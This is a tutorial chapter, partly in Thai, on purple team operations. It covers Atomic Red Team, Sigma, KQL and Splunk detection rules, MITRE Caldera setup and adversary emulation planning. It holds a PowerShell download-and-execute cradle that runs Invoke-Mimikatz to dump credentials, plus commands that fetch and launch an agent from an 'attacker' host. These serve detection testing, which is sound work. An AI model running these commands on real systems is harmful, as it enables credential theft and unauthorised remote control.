# Part 92: Purple Team Operations (Steps 911-920)

## ภาพรวม
Purple Team Operations คือการรวมทีม Red และ Blue เพื่อเสริมสร้างประสิทธิภาพในการตรวจจับและการป้องกัน

---

## Step 911: Purple Team Fundamentals

```python
from dataclasses import dataclass, field
from typing import List, Dict, Optional
from enum import Enum

class TeamRole(Enum):
    RED = "Red Team (Attackers)"
    BLUE = "Blue Team (Defenders)"
    PURPLE = "Purple Team (Collaborative)"

@dataclass
class PurpleTeamExercise:
    name: str
    objective: str
    red_actions: List[str]
    blue_detections: List[str]
    gaps_identified: List[str]
    improvements: List[str]
    mitre_techniques: List[str]

class PurpleTeamFramework:
    """Purple team exercise framework"""
    
    EXERCISE_TYPES = {
        "Tabletop": "Discussion-based walkthrough of attack scenarios",
        "Atomic": "Test single atomic technique in isolation",
        "Full Scenario": "Complete attack chain simulation",
        "Assumed Breach": "Start from compromised endpoint, test detection",
        "Adversary Emulation": "Emulate specific threat actor TTPs"
    }
    
    PURPLE_TEAM_PROCESS = [
        "1. Define scope and objectives",
        "2. Select MITRE ATT&CK techniques to test",
        "3. Red executes technique in controlled manner",
        "4. Blue confirms detection or identifies gap",
        "5. If gap found: develop detection rule",
        "6. Re-test to confirm detection works",
        "7. Document findings and improvements",
        "8. Track metrics and improvement over time"
    ]
    
    BENEFITS = [
        "Validates that detection tools actually work",
        "Identifies gaps in detection coverage",
        "Improves Blue team knowledge of attack TTPs",
        "Improves Red team knowledge of defensive tools",
        "Creates actionable detection improvements",
        "Builds collaborative security culture"
    ]
    
    def create_exercise(self, technique_id: str, technique_name: str) -> PurpleTeamExercise:
        """Create a purple team exercise for a MITRE technique"""
        return PurpleTeamExercise(
            name=f"Purple Team: {technique_name}",
            objective=f"Validate detection of {technique_name} ({technique_id})",
            red_actions=[
                f"Execute {technique_name} in test environment",
                "Document exact commands/tools used",
                "Note artifacts left on system"
            ],
            blue_detections=[
                "Check SIEM for relevant events",
                "Verify alerts triggered in SOC",
                "Document detection timeline"
            ],
            gaps_identified=[],
            improvements=[],
            mitre_techniques=[technique_id]
        )

if __name__ == '__main__':
    fw = PurpleTeamFramework()
    print("Exercise Types:")
    for etype, desc in fw.EXERCISE_TYPES.items():
        print(f"  {etype}: {desc}")
    print("\nPurple Team Process:")
    for step in fw.PURPLE_TEAM_PROCESS:
        print(f"  {step}")
    print("\nBenefits:")
    for b in fw.BENEFITS:
        print(f"  - {b}")
```

---

## Step 912: Atomic Red Team

การใช้ Atomic Red Team สำหรับทดสอบ techniques

```python
import subprocess
import json
from typing import List, Dict
from pathlib import Path

class AtomicRedTeam:
    """Atomic Red Team framework integration"""
    
    # Example atomic test structure
    ATOMIC_TEST_EXAMPLE = {
        "attack_technique": "T1059.001",
        "display_name": "Command and Scripting Interpreter: PowerShell",
        "atomic_tests": [
            {
                "name": "Mimikatz - Dump Credentials",
                "auto_generated_guid": "7a42cf2e-2ac9-4ff4-a51e-7aadf46a8c88",
                "description": "Dumps credentials from Windows using Mimikatz",
                "supported_platforms": ["windows"],
                "executor": {
                    "command": "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz",
                    "name": "powershell",
                    "elevation_required": True
                },
                "dependencies": [],
                "cleanup_command": "Remove-Item -Force $env:TEMP\\mimikatz.exe -ErrorAction SilentlyContinue"
            }
        ]
    }
    
    def run_atomic_test_ps(self, technique_id: str, test_number: int = None) -> str:
        """PowerShell command to run Atomic Red Team test"""
        cmd = f"Invoke-AtomicTest {technique_id}"
        if test_number:
            cmd += f" -TestNumbers {test_number}"
        return cmd
    
    def install_atomic_red_team(self) -> List[str]:
        """Install Atomic Red Team on Windows"""
        return [
            "# Install PowerShell module",
            "Install-Module -Name invoke-atomicredteam",
            "# Import and configure",
            "Import-Module invoke-atomicredteam",
            "# Set atomics path",
            "$PSDefaultParameterValues = @{'Invoke-AtomicTest:PathToAtomicsFolder' = 'C:\\AtomicRedTeam\\atomics'}",
            "# Install all atomics",
            "Invoke-AtomicTest All -GetPrereqs"
        ]
    
    def coverage_map(self) -> Dict[str, List[str]]:
        """Map atomic tests to detection coverage"""
        return {
            "T1059.001 (PowerShell)": [
                "Sysmon Event 1 (Process Create)",
                "PowerShell Script Block Logging (Event 4104)",
                "Windows Defender ATP"
            ],
            "T1003.001 (LSASS Dump)": [
                "Sysmon Event 10 (Process Access to lsass.exe)",
                "Windows Defender credential theft alert",
                "EDR behavioral detection"
            ],
            "T1547.001 (Registry Run Keys)": [
                "Sysmon Event 13 (Registry value set)",
                "Windows Event 4657 (Registry value modified)"
            ],
            "T1053.005 (Scheduled Tasks)": [
                "Windows Event 4698 (Scheduled Task Created)",
                "Sysmon Event 1 (schtasks.exe execution)"
            ]
        }
    
    def generate_test_report(self, results: List[Dict]) -> str:
        """Generate purple team test report"""
        report = "# Atomic Red Team Test Results\n\n"
        report += "| Technique | Test Name | Executed | Detected | Gap |"
        report += "\n|-----------|-----------|---------|---------|-----|\n"
        for r in results:
            detected = 'Yes' if r.get('detected') else 'No'
            gap = r.get('gap', '') if not r.get('detected') else ''
            report += f"| {r['technique']} | {r['name']} | Yes | {detected} | {gap} |\n"
        return report

if __name__ == '__main__':
    art = AtomicRedTeam()
    print("Install Atomic Red Team:")
    for cmd in art.install_atomic_red_team():
        print(f"  {cmd}")
    print("\nDetection Coverage Map:")
    for technique, events in art.coverage_map().items():
        print(f"  {technique}:")
        for event in events:
            print(f"    - {event}")
    print("\nRun Atomic Test (PS):")
    print(art.run_atomic_test_ps("T1059.001", 1))
```

---

## Step 913: Detection Engineering

การสร้างและทดสอป Detection Rules

```python
from typing import Dict, List

class DetectionEngineering:
    """Detection rule creation and validation"""
    
    def sigma_rule_template(self, technique: str, title: str, query: str) -> str:
        """Generate Sigma detection rule"""
        return f"""
title: {title}
id: {hash(title) % 10000:04x}-xxxx-xxxx-xxxx-xxxxxxxxxxxx
status: experimental
description: Detects {technique}
references:
    - https://attack.mitre.org/techniques/{technique.replace('.', '/')}/
author: Purple Team
date: 2024-01-01
tags:
    - attack.{technique.lower()}
logsource:
    product: windows
    category: process_creation
detection:
    selection:
{chr(10).join('        ' + line for line in query.strip().split(chr(10)))}
    condition: selection
falsepositives:
    - Legitimate administrative activity
level: high
        """
    
    def kql_detection_queries(self) -> Dict[str, str]:
        """KQL queries for Microsoft Sentinel/Defender"""
        return {
            "kerberoasting_detection": """
// Detect Kerberoasting: Multiple TGS requests for RC4 encryption in short time
SecurityEvent
| where EventID == 4769
| where TicketEncryptionType == "0x17"  // RC4
| where ServiceName != "krbtgt"
| where ServiceName !endswith "$"
| summarize RequestCount = count() by SourceHostName, ServiceName, bin(TimeGenerated, 5m)
| where RequestCount > 5
| order by RequestCount desc
            """,
            "lsass_access": """
// Detect LSASS memory access
DeviceEvents
| where ActionType == "ProcessAccess"
| where FileName =~ "lsass.exe"
| where AccessType has_any ("0x1010", "0x1410")  // Common dump access masks
| where InitiatingProcessFileName !in~ ("csrss.exe", "werfault.exe", "taskmgr.exe")
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine
            """,
            "wmi_subscription": """
// Detect WMI permanent event subscriptions
DeviceEvents
| where ActionType == "WmiBindEventFilterToConsumer"
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
            """,
            "registry_run_key": """
// Detect new Run key persistence
DeviceRegistryEvents
| where RegistryKey has "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
| where ActionType == "RegistryValueSet"
| where InitiatingProcessFileName !in~ ("msiexec.exe", "setup.exe", "svchost.exe")
| project Timestamp, DeviceName, RegistryKey, RegistryValueData, InitiatingProcessFileName
            """
        }
    
    def splunk_queries(self) -> Dict[str, str]:
        """Splunk SPL detection queries"""
        return {
            "mimikatz_detection": """
index=wineventlog EventCode=10 TargetImage="*lsass.exe"
| eval access_mask=replace(GrantedAccess,"0x","")
| where access_mask IN ("1010","1fffff","1410","143a")
| stats count by ComputerName, SourceImage
| where count > 0
            """,
            "powershell_encoded": """
index=wineventlog EventCode=4104 (Message="*encodedcommand*" OR Message="*-enc *")
| regex Message="-[Ee][Nn][Cc] [A-Za-z0-9+/=]{50,}"
| table _time, ComputerName, Message
            """,
            "unusual_parent": """
index=sysmon EventCode=1 ParentImage="*explorer.exe"
(CommandLine="*powershell*" OR CommandLine="*cmd.exe*" OR CommandLine="*cscript*")
| stats count by Computer, Image, ParentImage, CommandLine
| where count < 5  // Rare process launches
            """
        }
    
    def detection_maturity_levels(self) -> Dict[str, str]:
        """Detection maturity model"""
        return {
            "Level 0 - None": "No detection capability",
            "Level 1 - Indicator": "IOC-based (IP, hash, domain) - reactive",
            "Level 2 - Behavior": "Behavioral patterns - more resilient",
            "Level 3 - Situational": "Context-aware, baseline deviations",
            "Level 4 - Analytics": "ML/AI-based anomaly detection"
        }

if __name__ == '__main__':
    de = DetectionEngineering()
    print("Detection Maturity Levels:")
    for level, desc in de.detection_maturity_levels().items():
        print(f"  {level}: {desc}")
    print("\nKQL Queries available:")
    for query_name in de.kql_detection_queries():
        print(f"  - {query_name}")
    print("\nSample Sigma Rule:")
    sigma = de.sigma_rule_template(
        "T1547.001",
        "Suspicious Registry Run Key Persistence",
        "Image|endswith: '\\\\reg.exe'\n        CommandLine|contains: 'CurrentVersion\\\\Run'"
    )
    print(sigma[:400])
```

---

## Steps 914-920: Purple Team Operations Continued

```python
from typing import Dict, List

class PurpleTeamOperations:
    """Steps 914-920: Full Purple Team Operations"""
    
    # Step 914: MITRE ATT&CK Navigator
    ATTACK_NAVIGATOR_USAGE = {
        "url": "https://mitre-attack.github.io/attack-navigator/",
        "use_cases": [
            "Visualize coverage of detection rules against ATT&CK matrix",
            "Compare Red vs Blue coverage gaps",
            "Track exercise coverage over time",
            "Generate heat maps of tested techniques"
        ],
        "json_layer_format": """
{
    "name": "Purple Team Coverage",
    "versions": {"attack": "14", "navigator": "4.9"},
    "techniques": [
        {
            "techniqueID": "T1059.001",
            "score": 2,
            "color": "#ff0000",
            "comment": "Tested - Not Detected"
        },
        {
            "techniqueID": "T1547.001",
            "score": 10,
            "color": "#00ff00",
            "comment": "Tested - Detected Successfully"
        }
    ]
}
        """
    }
    
    # Step 915: Breach and Attack Simulation (BAS) platforms
    BAS_PLATFORMS = {
        "Cymulate": "Commercial BAS platform - automated continuous testing",
        "AttackIQ": "Enterprise BAS with MITRE ATT&CK alignment",
        "SafeBreach": "Continuous security validation platform",
        "Infection Monkey": "Open-source breach simulation",
        "Caldera": "MITRE open-source adversary emulation platform"
    }
    
    # Step 916: MITRE Caldera setup
    CALDERA_SETUP = """
# Install MITRE Caldera
git clone https://github.com/mitre/caldera.git --recursive
cd caldera
pip3 install -r requirements.txt
python3 server.py --insecure  # Dev mode

# Access: http://localhost:8888
# Default credentials: red/admin and blue/admin

# Deploy agent (Sandcat) on target:
# Linux:
server="http://attacker:8888";
curl -s -X POST -H 'file:sandcat.go' -H 'platform:linux' $server/file/download > agent
chmod +x agent && nohup ./agent -server $server -group red &

# Windows:
$url='http://attacker:8888'
$ProgressPreference = 'SilentlyContinue'
Invoke-WebRequest -Uri $url/file/download -Headers @{file='sandcat.go';platform='windows'} -OutFile agent.exe
Start-Process -NoNewWindow agent.exe -ArgumentList "-server $url -group red"
    """
    
    # Step 917: Adversary emulation plan
    ADVERSARY_EMULATION = {
        "process": [
            "1. Select threat actor (APT29, APT41, etc.)",
            "2. Research their TTPs from threat reports",
            "3. Map TTPs to MITRE ATT&CK techniques",
            "4. Build test plan for each technique",
            "5. Execute in phases mirroring actor's kill chain",
            "6. Measure detection coverage at each phase"
        ],
        "apt29_phases": [
            "Initial Access: Spear phishing with malicious attachment",
            "Execution: PowerShell download + execute",
            "Persistence: Registry Run key",
            "Defense Evasion: Obfuscated PowerShell, DLL side-loading",
            "Credential Access: LSASS dump, Kerberoasting",
            "Discovery: BloodHound AD enumeration",
            "Lateral Movement: WMI, PsExec",
            "Collection: File staging",
            "Exfiltration: DNS/HTTPS C2"
        ]
    }
    
    # Step 918: Purple team metrics
    METRICS = {
        "detection_rate": "% of executed techniques that were detected",
        "mean_time_to_detect": "Average time from execution to alert",
        "false_positive_rate": "Alerts triggered that are not real attacks",
        "coverage_increase": "% improvement in ATT&CK technique coverage",
        "detection_gap_count": "Number of gaps found and remediated",
        "rule_quality_score": "Effectiveness score for detection rules"
    }
    
    # Step 919: Purple team report template
    REPORT_TEMPLATE = """
# Purple Team Exercise Report
## Date: {date}
## Exercise Type: {type}
## Duration: {duration}

## Executive Summary
- Techniques Tested: {total_tested}
- Detected: {detected} ({detection_rate}%)
- Gaps Identified: {gaps}
- Detection Rules Created: {new_rules}

## Coverage Heatmap
[Attach ATT&CK Navigator layer]

## Technique Results
| Technique ID | Name | Executed | Detected | Time to Detect | Gap Notes |
|-------------|------|---------|---------|---------------|----------|

## Gaps and Improvements
### Critical Gaps (No Detection):
{critical_gaps}

### New Detection Rules Created:
{new_detections}

## Recommendations
1. Priority 1 (Critical Gaps):
2. Priority 2 (Improve Existing Rules):
3. Priority 3 (Tooling Improvements):
    """
    
    # Step 920: Continuous purple teaming
    CONTINUOUS_PURPLE_TEAM = {
        "automated_validation": [
            "Deploy BAS platform for 24/7 automated testing",
            "Run Atomic Red Team tests on schedule (weekly)",
            "Integrate with CI/CD for detection rule changes",
            "Track ATT&CK coverage metrics over time"
        ],
        "detection_rule_lifecycle": [
            "Create: Purple team exercise identifies gap",
            "Develop: Detection engineer writes Sigma/KQL rule",
            "Test: Atomic Red Team validates rule triggers",
            "Deploy: Rule pushed to SIEM/EDR",
            "Monitor: Track false positive rate",
            "Tune: Adjust to reduce false positives",
            "Review: Quarterly review for relevance"
        ],
        "kpis": {
            "quarterly": "Increase ATT&CK detection coverage by 15%",
            "annually": "Achieve 70%+ coverage of most common techniques",
            "ongoing": "Maintain false positive rate < 5%"
        }
    }
    
    def generate_test_plan(self, techniques: List[str]) -> List[Dict]:
        """Generate purple team test plan for given techniques"""
        plan = []
        for technique in techniques:
            plan.append({
                "technique": technique,
                "steps": [
                    f"Execute {technique} using Atomic Red Team",
                    "Document exact commands and artifacts",
                    "Check SIEM for detection within 5 minutes",
                    "Record detection time and alert quality",
                    "If not detected: create detection rule",
                    "Re-test after rule deployment"
                ],
                "success_criteria": f"Alert generated within 15 minutes for {technique}"
            })
        return plan

if __name__ == '__main__':
    ops = PurpleTeamOperations()
    print("BAS Platforms:")
    for platform, desc in ops.BAS_PLATFORMS.items():
        print(f"  {platform}: {desc}")
    print("\nAdversary Emulation - APT29 Phases:")
    for phase in ops.ADVERSARY_EMULATION['apt29_phases']:
        print(f"  - {phase}")
    print("\nPurple Team Metrics:")
    for metric, desc in ops.METRICS.items():
        print(f"  {metric}: {desc}")
    print("\nTest Plan for T1059.001:")
    plan = ops.generate_test_plan(["T1059.001", "T1547.001"])
    for test in plan[:1]:
        print(f"  Technique: {test['technique']}")
        for step in test['steps']:
            print(f"    - {step}")
```

---

## สรุป Part 92

1. **Step 911**: Purple team fundamentals - types, process, benefits
2. **Step 912**: Atomic Red Team - installation, running tests, coverage mapping
3. **Step 913**: Detection engineering - Sigma rules, KQL, Splunk SPL
4. **Step 914**: MITRE ATT&CK Navigator for coverage visualization
5. **Step 915**: Breach and Attack Simulation (BAS) platforms
6. **Step 916**: MITRE Caldera setup for automated adversary emulation
7. **Step 917**: Adversary emulation planning - APT29 kill chain
8. **Step 918**: Purple team metrics and KPIs
9. **Step 919**: Exercise report template
10. **Step 920**: Continuous purple teaming - automated validation lifecycle

**เครื่องมือหลัก**: Atomic Red Team, MITRE Caldera, ATT&CK Navigator, Cymulate, AttackIQ
